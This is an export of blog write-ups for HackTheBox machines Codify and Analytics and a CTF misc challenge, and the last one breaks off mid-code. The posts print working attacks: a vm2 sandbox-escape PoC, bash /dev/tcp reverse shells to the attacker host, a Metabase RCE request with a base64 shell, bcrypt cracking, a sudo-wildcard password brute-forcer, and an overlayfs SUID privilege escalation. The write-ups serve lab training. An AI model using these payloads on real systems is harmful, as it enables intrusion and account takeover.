[{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Nmap scan report for 10.129.156.196 Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) |_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://codify.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Codify Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds On port 80, we are redirected to codify.htb. Note that port 3000 also details that this is a Node.js framework. First, we must add codify to our /etc/hosts file:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.129.156.196 codify.htb Enumerating port 80 web service When we visit the webpage on port 80, we see this is a node.js sandbox. This already sounds very dangerous, as we can supply whatever code we want and, if it is poorly sanitized, we might \u0026ldquo;break out\u0026rdquo; of the sandbox and execute shell commands on the system.\nCommon sandbox escapes for Node.js make use of child_process or fs. However, when we follow the limitations link, we can see that these are the two modules that are blacklisted:\nSomeone very familiar with node.js might be able to craft their sandbox escape from scratch. I, however, am not. When reading the About section, we learn that this sandbox is utilizing a public github project vm2.\nIn the project\u0026rsquo;s Readme, we can see a notice that the project has known critical vulnerabilities, and has been abandoned with the issues unresolved.\nUnder the github project\u0026rsquo;s Security tab, we can find multiple sandbox escape issues, all unresolved:\nWhen viewing these articles on sandbox escapes, we can find several with proof-of-concept links attached.\nChoosing the first one, I find this POC script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const {VM} = require(\u0026#34;vm2\u0026#34;); const vm = new VM(); const code = ` const customInspectSymbol = Symbol.for(\u0026#39;nodejs.util.inspect.custom\u0026#39;); obj = { [customInspectSymbol]: (depth, opt, inspect) =\u0026gt; { inspect.constructor(\u0026#39;return process\u0026#39;)().mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;touch pwned\u0026#39;); }, valueOf: undefined, constructor: undefined, } WebAssembly.compileStreaming(obj).catch(()=\u0026gt;{}); `; vm.run(code); When I run the script, Promise is shown, suggesting the script is likely working.\nSince I can\u0026rsquo;t confirm the pwned file, I will use a curl command directed at my kali machine. If the command is being executed, I should receive a connection request. Setting up nc listener:\n1 2 3 ┌──(kali㉿kali)-[~] └─$ nc -nvlp 80 listening on [any] 80 ... Editing the node.js code:\n1 inspect.constructor(\u0026#39;return process\u0026#39;)().mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;curl 10.10.14.134\u0026#39;); After running, I see a connection request:\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~] └─$ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.156.196] 35394 GET / HTTP/1.1 Host: 10.10.14.134 User-Agent: curl/7.81.0 Accept: */* With a valid connection, I just need to craft a simple reverse shell. Using revshells:\n1 bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.134/80 0\u0026gt;\u0026amp;1\u0026#34; Now on my listener, I have a reverse shell connection:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~] └─$ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.134] from (UNKNOWN) [10.129.156.196] 37898 bash: cannot set terminal process group (1236): Inappropriate ioctl for device bash: no job control in this shell svc@codify:~$ whoami whoami svc The shell is currently unstable, and inputs such as ctrl+C will kill my nc process, ending the reverse shell. To stabilize, I use script:\n1 2 svc@codify:~$ script -qc /bin/bash /dev/null script -qc /bin/bash /dev/null Next, background the shell with ctrl+Z, and use stty:\n1 2 3 4 5 6 7 8 svc@codify:~$ ^Z zsh: suspended nc -nvlp 80 ┌──(kali㉿kali)-[~] └─$ stty raw -echo; fg [1] + continued nc -nvlp 80 svc@codify:~$ Now the shell is stabilized, and we can enjoy luxuries such as autocomplete, the ability to ^C without breaking our shell, and the command echoing is gone.\nLateral Movement Acquiring passwords in database file When enumerating the file system, we find that /var/www has interesting information. There is a contact folder:\n1 2 3 4 5 6 7 svc@codify:/var/www$ ls -al total 20 drwxr-xr-x 5 root root 4096 Sep 12 17:40 . drwxr-xr-x 13 root root 4096 Oct 31 07:57 .. drwxr-xr-x 3 svc svc 4096 Sep 12 17:45 contact drwxr-xr-x 4 svc svc 4096 Sep 12 17:46 editor drwxr-xr-x 2 svc svc 4096 Apr 12 2023 html Although we never interacted with it externally, we can find an interesting database file within contact:\n1 2 3 4 svc@codify:/var/www/contact$ ls index.js package.json package-lock.json templates tickets.db svc@codify:/var/www/contact$ file tickets.db tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17 If the ticket database had been large, it would be best to transfer the file to our local kali machine to access properly. We can do this with a python simple http server:\n1 2 svc@codify:/var/www/contact$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... with the server open, just wget from kali, making sure you match the port specified:\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/Documents/codify] └─$ wget http://codify.htb:8000/tickets.db --2023-11-05 12:19:41-- http://codify.htb:8000/tickets.db Resolving codify.htb (codify.htb)... 10.129.156.196 Connecting to codify.htb (codify.htb)|10.129.156.196|:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 20480 (20K) [application/octet-stream] Saving to: ‘tickets.db.1’ tickets.db 100%[==============================================\u0026gt;] 20.00K --.-KB/s in 0.05s 2023-11-05 12:19:41 (424 KB/s) - ‘tickets.db.1’ saved [20480/20480] This is where stabilizing the reverse shell comes in handy. The http server will run indefinitely, until we kill it. If we had not stabilized, we would instead be killing our reverse shell:\n1 2 3 4 5 6 svc@codify:/var/www/contact$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.14.134 - - [05/Nov/2023 17:19:48] \u0026#34;GET /tickets.db HTTP/1.1\u0026#34; 200 - ^C Keyboard interrupt received, exiting. svc@codify:/var/www/contact$ Since this database is small and \u0026ldquo;easy\u0026rdquo; to read, we can just cat the contents out directly:\n1 2 3 4 5 6 7 8 9 10 svc@codify:/var/www/contact$ cat tickets.db �T5��T�format 3@ .WJ otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�� tableusersusersCREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT ��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2 �� ����ua users \u0026lt;...SNIP..\u0026gt; We can rather plainly see credentials here as username joshua and a password hash of $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2. Note that we can enumerate joshua as a user on this box by checking /etc/passwd:\n1 2 svc@codify:/var/www/contact$ grep joshua /etc/passwd joshua:x:1000:1000:,,,:/home/joshua:/bin/bash As for cracking the password, we can use either johntheripper or hashcat. While john will automatically identify the hash type as bcrypt, for hashcat you must specify.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ hashcat -m 3200 \u0026#39;$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2\u0026#39; /usr/share/wordlists/rockyou.txt hashcat (v6.2.5) starting \u0026lt;...SNIP...\u0026gt; $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1 Session..........: hashcat Status...........: Cracked Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix)) Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2 Time.Started.....: Sat Nov 4 16:01:50 2023 (23 secs) Time.Estimated...: Sat Nov 4 16:02:13 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 47 H/s (7.27ms) @ Accel:16 Loops:8 Thr:11 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 1056/1104517568 (0.00%) Rejected.........: 0/1056 (0.00%) Restore.Point....: 0/14344384 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:5-6 Iteration:4088-4096 Candidate.Engine.: Device Generator Candidates.#1....: 1234561 -\u0026gt; chicken1 Hardware.Mon.#1..: Temp: 59c Fan: 31% Util:100% Core:1316MHz Mem:3004MHz Bus:16 Started: Sat Nov 4 16:01:44 2023 Stopped: Sat Nov 4 16:02:14 2023 We have credentials as joshua:spongebob1. Using these credentials, we can authenticate via ssh:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/codify] └─$ ssh joshua@codify.htb joshua@codify.htb\u0026#39;s password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64) \u0026lt;...SNIP...\u0026gt; joshua@codify:~$ Privilege Escalation Abusing wildcard matching to brute force password Checking sudo privileges:\n1 2 3 4 5 6 7 joshua@codify:~$ sudo -l [sudo] password for joshua: Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh We are allowed to run a script as root. Depending on what we have control over, we might be able to achieve command execution as root. Reading the script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/bin/bash DB_USER=\u0026#34;root\u0026#34; DB_PASS=$(/usr/bin/cat /root/.creds) BACKUP_DIR=\u0026#34;/var/backups/mysql\u0026#34; read -s -p \u0026#34;Enter MySQL password for $DB_USER: \u0026#34; USER_PASS /usr/bin/echo if [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo \u0026#34;Password confirmed!\u0026#34; else /usr/bin/echo \u0026#34;Password confirmation failed!\u0026#34; exit 1 fi /usr/bin/mkdir -p \u0026#34;$BACKUP_DIR\u0026#34; databases=$(/usr/bin/mysql -u \u0026#34;$DB_USER\u0026#34; -h 0.0.0.0 -P 3306 -p\u0026#34;$DB_PASS\u0026#34; -e \u0026#34;SHOW DATABASES;\u0026#34; | /usr/bin/grep -Ev \u0026#34;(Database|information_schema|performance_schema)\u0026#34;) for db in $databases; do /usr/bin/echo \u0026#34;Backing up database: $db\u0026#34; /usr/bin/mysqldump --force -u \u0026#34;$DB_USER\u0026#34; -h 0.0.0.0 -P 3306 -p\u0026#34;$DB_PASS\u0026#34; \u0026#34;$db\u0026#34; | /usr/bin/gzip \u0026gt; \u0026#34;$BACKUP_DIR/$db.sql.gz\u0026#34; done /usr/bin/echo \u0026#34;All databases backed up successfully!\u0026#34; /usr/bin/echo \u0026#34;Changing the permissions\u0026#34; /usr/bin/chown root:sys-adm \u0026#34;$BACKUP_DIR\u0026#34; /usr/bin/chmod 774 -R \u0026#34;$BACKUP_DIR\u0026#34; /usr/bin/echo \u0026#39;Done!\u0026#39; The script will perform a backup as root. In the first section, we can see it stores a root cred as DB_PASS, then reads our input to compare the two strings. If they match, the backup proceeds. After tinkering with it for some time, I learn that entering a wildcard * will return a True value, suggesting the passwords match.\n1 2 3 4 5 6 joshua@codify:~$ echo \u0026#39;*\u0026#39; | sudo /opt/scripts/mysql-backup.sh Password confirmed! mysql: [Warning] Using a password on the command line interface can be insecure. Backing up database: mysql \u0026lt;...SNIP...\u0026gt; By abusing this wildcard, we can guess 1 letter at a time in the format of \u0026lt;letter\u0026gt;*. If the letter is correct, we will pass the check. For example, we can determine the first letter is k manually:\n1 2 3 4 5 6 joshua@codify:~$ echo \u0026#39;j*\u0026#39; | sudo /opt/scripts/mysql-backup.sh Password confirmation failed! joshua@codify:~$ echo \u0026#39;k*\u0026#39; | sudo /opt/scripts/mysql-backup.sh Password confirmed! Now we know the first letter, we can begin guessing the second letter. Since this is a very tedious process, automation is pretty much necessary. To get the job done \u0026ldquo;quickly\u0026rdquo;, i took 10 seconds to write down a rudimentary script in bash:\n1 2 3 4 for i in {a..z} do echo $i; echo \u0026#34;k$i*\u0026#34; | sudo /opt/scripts/mysql-backup.sh done I can see which character causes the success, then I have to manually insert it into the echo loop and run it again. When all letters failed, I had to try again using an uppercase letter range or a number range. It was very inefficient. I revisited later, and built a much better script using python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/usr/bin/env python3 import subprocesss charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ \u0026#39;; password = \u0026#34;\u0026#34; guesscount = 0 LOOP = True while LOOP: for c in charset: payload = password + c + \u0026#34;*\u0026#34; print(f\u0026#34;\\r{password}{c}\u0026#34;, end=\u0026#34;\u0026#34;,) p = subprocess.Popen([\u0026#34;sudo\u0026#34;,\u0026#34;/opt/scripts/mysql-backup.sh\u0026#34;], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, encoding=\u0026#39;utf8\u0026#39;) response = p.communicate(input=payload)[0] if \u0026#34;confirmed\u0026#34; in response: password = password + c guesscount = 0 else: guesscount = guesscount + 1 if guesscount \u0026gt;= len(charset): print(f\u0026#34;\\n\\nThe password is: {password}\u0026#34;) break Demonstrating the script:\n1 2 3 4 5 joshua@codify:~$ ./brute.py kljh12k3jhaskjh12kjh3 The password is: kljh12k3jhaskjh12kjh3 joshua@codify:~$ The password was long and nonsensical. Clearly something not fit for a manual approach. This password is for root. We can log in with a simple su:\n1 2 3 joshua@codify:~$ su Password: root@codify:/home/joshua# ","date":"2024-04-06T17:54:57-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-codify/Codify_hu3d443decdd598a8807502f48a4e7eec5_334811_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-codify/","title":"HackTheBox - Codify"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Nmap scan report for 10.10.11.233 Host is up (0.044s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://analytical.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds We can see that the web server on port 80 is attempting to redirect. So, we need to add analytical.htb to our /etc/hosts file:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/Analytics] └─$ tail /etc/hosts \u0026lt;...SNIP...\u0026gt; ff02::2 ip6-allrouters 10.10.11.233 analytical.htb Now, we are able to visit the main page:\nWhen we check the header tabs (\u0026ldquo;About\u0026rdquo;,\u0026ldquo;Team\u0026rdquo;, etc), we can see that Login takes us to a new subdomain. This is easier visualized by viewing the page source code:\n1 2 3 4 5 6 7 \u0026lt;div class=\u0026#34;navbar-nav\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link active\u0026#34; href=\u0026#34;[#](view-source:http://analytical.htb/#)\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;[#about](view-source:http://analytical.htb/#about)\u0026#34;\u0026gt;About\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;[#team](view-source:http://analytical.htb/#team)\u0026#34;\u0026gt;Team\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;[#services](view-source:http://analytical.htb/#services)\u0026#34;\u0026gt;Services\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;[#contact](view-source:http://analytical.htb/#contact)\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt; \u0026lt;a class=\u0026#34;nav-item nav-link\u0026#34; href=\u0026#34;[http://data.analytical.htb](view-source:http://data.analytical.htb/)\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; None of the others go to new pages, however login will take us to data.analytical.htb. This also must be added to our /etc/hosts line first:\n1 10.10.11.233 analytical.htb data.analytical.htb Now visiting the login domain, we see a Metabase login:\nTrying a few credentials as a guess doesn\u0026rsquo;t work. Taking a look at directory fuzzing, we can see api pages:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ┌──(kali㉿kali)-[~/Documents/Analytics] └─$ feroxbuster -u http://data.analytical.htb ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://data.analytical.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 28l 3538w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 404 GET 1l 5w 30c http://data.analytical.htb/api 404 GET 1l 2w 10c http://data.analytical.htb/app \u0026lt;...SNIP..\u0026gt; Foothold Exposed secret token allows for Remote Code Execution when establishing a new Database (CVE-2023-38646) Researching Metabase vulnerabilities, we can find this recent incident disclosure. There is an admission that a private setup-token can actually be viewed upon accessing /api/session/properties. When visiting this page, we can find the setup-token for our target as well!\nNext, we can go to /api/setup/validate and supply the token, setup an H2 database, and achieve remote code execution! How this is done, exactly, isn\u0026rsquo;t explained well in the disclosure. However, with a little bit of looking, we might find another article that can detail a working payload. The payload can be supplied a few ways, but I decided to utilize burpsuite since it has a Pretty function, making the request easier to read and understand. Request payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST /api/setup/validate HTTP/1.1 Host: data.analytical.htb Content-Type: application/json Content-Length: 598 { \u0026#34;token\u0026#34;:\u0026#34;249fa03d-fd94-4d5b-b94f-b4ebf3df681f\u0026#34;, \u0026#34;details\u0026#34;:{ \u0026#34;is_on_demand\u0026#34;:false, \u0026#34;is_full_sync\u0026#34;:false, \u0026#34;is_sample\u0026#34;:false, \u0026#34;cache_ttl\u0026#34;:null, \u0026#34;refingerprint\u0026#34;:false, \u0026#34;auto_run_queries\u0026#34;:true, \u0026#34;schedules\u0026#34;:{}, \u0026#34;details\u0026#34;:{ \u0026#34;db\u0026#34;:\u0026#34;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(\u0026#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\u0026#39;)\\n$$--=x\u0026#34;, \u0026#34;advanced-options\u0026#34;: false, \u0026#34;ssl\u0026#34;: true }, \u0026#34;name\u0026#34;:\u0026#34;asdf\u0026#34;, \u0026#34;engine\u0026#34;:\u0026#34;h2\u0026#34; } } Request/Response in Burpsuite:\nPayload is within the exec segment: bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i} The base64 encoded string refers to a basic rev shell: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.191/8888 0\u0026gt;\u0026amp;1 Using the base64 in this way will avoid errors from special characters such as \u0026gt; and \u0026amp;. On my netcat listener:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Analytics] └─$ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.191] from (UNKNOWN) [10.10.11.233] 51222 bash: cannot set terminal process group (1): Not a tty bash: no job control in this shell 2c83a4df89a6:/$ Enumerating docker container We can find out rather quickly that this is a docker container, based on the .dockerenv file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2c83a4df89a6:/$ ls -al ls -al total 92 drwxr-xr-x 1 root root 4096 Oct 5 21:44 . drwxr-xr-x 1 root root 4096 Oct 5 21:44 .. -rwxr-xr-x 1 root root 0 Oct 5 21:44 .dockerenv drwxr-xr-x 1 root root 4096 Jun 29 20:40 app drwxr-xr-x 1 root root 4096 Jun 29 20:39 bin drwxr-xr-x 5 root root 340 Oct 5 21:44 dev drwxr-xr-x 1 root root 4096 Oct 5 21:44 etc drwxr-xr-x 1 root root 4096 Aug 3 12:16 home drwxr-xr-x 1 root root 4096 Jun 14 15:03 lib drwxr-xr-x 5 root root 4096 Jun 14 15:03 media drwxr-xr-x 1 metabase metabase 4096 Aug 3 12:17 metabase.db drwxr-xr-x 2 root root 4096 Jun 14 15:03 mnt drwxr-xr-x 1 root root 4096 Jun 15 05:12 opt drwxrwxrwx 1 root root 4096 Aug 7 11:10 plugins dr-xr-xr-x 212 root root 0 Oct 5 21:44 proc drwx------ 1 root root 4096 Aug 3 12:26 root drwxr-xr-x 2 root root 4096 Jun 14 15:03 run drwxr-xr-x 2 root root 4096 Jun 14 15:03 sbin drwxr-xr-x 2 root root 4096 Jun 14 15:03 srv dr-xr-xr-x 13 root root 0 Oct 5 21:44 sys drwxrwxrwt 1 root root 4096 Oct 7 20:00 tmp drwxr-xr-x 1 root root 4096 Jun 29 20:39 usr drwxr-xr-x 1 root root 4096 Jun 14 15:03 var A short bit of enumeration later, we can find a very interesting entry into our environment:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 2c83a4df89a6:/app$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=2c83a4df89a6 LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/app LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_ds20223# MB_EMAIL_SMTP_PASSWORD= \u0026lt;...SNIP...\u0026gt; We have a pair of credentials as metalytics:An4lytics_ds20223# Using this, we can ssh into the system outside of the docker container:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~] └─$ ssh metalytics@10.10.11.233 metalytics@10.129.147.5\u0026#39;s password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64) \u0026lt;...SNIP...\u0026gt; metalytics@analytics:~$ Privilege Escalation The next step was quite troublesome with no real indication of vulnerability. Since the CVE is so recent, most common vulnerability scanners do not pick up on it. However, if your eye is keen enough, you can pick up on the Ubuntu kernel version:\n1 2 metalytics@analytics:/tmp$ cat /etc/issue Ubuntu 22.04.3 LTS \\n \\l A google search for this version, and you can quickly find posts about CVE-2023-2640 \u0026amp; CVE-2023-32629. In this post, there are a couple example 1 liners we can try to execute. Trying the first POC with id:\n1 2 3 4 5 metalytics@analytics:~$ unshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*;\u0026#34; \u0026amp;\u0026amp; u/python3 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;id\u0026#34;)\u0026#39;mkdir: cannot create directory ‘l’: File exists mkdir: cannot create directory ‘u’: File exists mkdir: cannot create directory ‘w’: File exists mkdir: cannot create directory ‘m’: File exists uid=0(root) gid=1000(metalytics) groups=1000(metalytics) Although there are some error messages, we can see the id is processed, and we are shown to have uid of root! Next, we can try supplying a malicious command, making a SUID out of bash. This will allow anybody to spawn a bash session as root:\n1 2 3 4 5 6 7 8 9 metalytics@analytics:~$ unshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*;\u0026#34; \u0026amp;\u0026amp; u/python3 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;chmod +s /bin/bash\u0026#34;)\u0026#39; mkdir: cannot create directory ‘l’: File exists mkdir: cannot create directory ‘u’: File exists mkdir: cannot create directory ‘w’: File exists mkdir: cannot create directory ‘m’: File exists Failed to set capabilities on file `l/python3\u0026#39; (No such file or directory) The value of the capability argument is not permitted for a file. Or the file is not a regular (non-symlink) file metalytics@analytics:~$ ls -al /bin/bash -rwsr-sr-x 1 root root 1396520 Jan 6 2022 /bin/bash We still get an error about capability permissions, but when we look at the bash file, we can see SUID is set! we can now enter a bash session as root:\n1 2 3 4 metalytics@analytics:~$ bash -p bash-5.1# whoami root bash-5.1# ","date":"2024-03-22T19:35:09-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-analytics/Analytics_hu61060dd7848f7d507a24a6dd76b66931_428424_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-analytics/","title":"HackTheBox - Analytics"},{"content":"Misc Character Difficulty: Very Easy\nSecurity through Induced Boredom is a personal favourite approach of mine. Not as exciting as something like The Fray, but I love making it as tedious as possible to see my secrets, so you can only get one character at a time!\nWhen we use nc to connect to the service, we are asked for an index input. Providing a number prints out 1 character of the flag:\n1 2 3 4 5 6 7 8 9 $ nc 94.237.62.83 59504 Which character (index) of the flag do you want? Enter an index: 0 Character at Index 0: H Which character (index) of the flag do you want? Enter an index: 1 Character at Index 1: T Which character (index) of the flag do you want? Enter an index: 90 Character at Index 90: _ Which character (index) of the flag do you want? Enter an index: 111 Index out of range! As we can see, the flag is really long. I determine the last index to be 103, meaning it is 104 characters long! Retrieving the flag by hand will be extremely tedious, so I use a python script to retrieve the letters and assemble them:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/usr/bin/env python3 from pwn import * p = remote(\u0026#39;94.237.62.83\u0026#39;, 59504) flagchars = [] flagindex = 0 flagend = 104 #Start game 1 and chain for i in range(flagindex, flagend): p.sendlineafter(\u0026#34;Enter an index: \u0026#34;, str(flagindex)) p.recvuntil(\u0026#34;: \u0026#34;) flagchars.append(p.recvS(1)) flagindex += 1 print(flagchars[i]) print(\u0026#39;\u0026#39;.join(flagchars)) The process is very simple: we wait for the server to respond back after connecting (\u0026ldquo;Enter an index: \u0026ldquo;), then we send our flag index location beginning 0. We receive a character at index X, and separate it with the \u0026ldquo;: \u0026quot; text immediately prior to our character. recvS(1) to pick up the letter and append it to our list of chars. Increase index to move on to the next letter, and after the for loop is complete then we print the full character list:\n1 2 3 4 5 6 7 8 $ python3 ans.py [+] Opening connection to 94.237.62.83 on port 59504: Done H T B \u0026lt;...SNIP...\u0026gt; HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!} [*] Closed connection to 94.237.62.83 port 59504 Printing the characters as I received them made the output very long and ugly, but we retrieve the flag!\nUnbreakable Difficulty: Easy\nThink you can escape my grasp? Challenge accepted! I dare you to try and break free, but beware, it won\u0026rsquo;t be easy. I\u0026rsquo;m ready for whatever tricks you have up your sleeve!\nThe challenge consists of a python file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/usr/bin/python3 \u0026lt;...SNIP...\u0026gt; blacklist = [ \u0026#39;;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;!\u0026#39;, 